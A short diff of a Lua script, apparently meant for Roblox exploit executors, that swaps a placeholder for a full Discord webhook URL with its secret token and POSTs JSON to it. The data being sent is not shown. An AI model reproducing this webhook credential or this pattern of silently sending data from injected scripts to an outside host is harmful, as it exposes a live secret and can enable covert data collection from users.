@@ -21,7 +21,7 @@ local requestFunc = (syn and syn.request) or (http and http.request) or (http_re
 if requestFunc then
     local success, response = pcall(function()
         return requestFunc({
-            Url = "https://discord.com/api/webhooks/ТВОЙ_ВЕБХУК",
+            Url = "https://discord.com/api/webhooks/1382969881992888471/iyZb4rFWDtfd0t3yoUWs_V9LAEIth0vpY8wIqL9VKinp5ycG7JcmoG2APfc5dSiTw8Li",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
